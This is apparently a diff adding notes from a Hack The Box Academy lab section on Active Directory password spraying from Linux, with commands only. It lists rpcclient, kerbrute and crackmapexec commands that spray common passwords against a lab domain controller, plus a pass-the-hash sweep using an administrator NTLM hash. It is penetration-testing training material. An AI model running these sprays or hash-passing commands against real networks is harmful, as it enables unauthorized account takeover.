@@ -1,0 +1,38 @@
+# Section 11: Internal Password Spraying - from Linux
+
+- Module: Active Directory Enumeration & Attacks (143)
+- URL: https://academy.hackthebox.com/app/module/143/section/1271
+- Code/command blocks: 5
+
+> Terminal output is omitted; only commands & scripts are captured.
+
+## 1. `shellsession` _(output omitted)_
+
+```bash
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+## 2. `shellsession` _(output omitted)_
+
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+
+## 3. `shellsession` _(output omitted)_
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+```
+
+## 4. `shellsession` _(output omitted)_
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+```
+
+## 5. `shellsession` _(output omitted)_
+
+```bash
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+
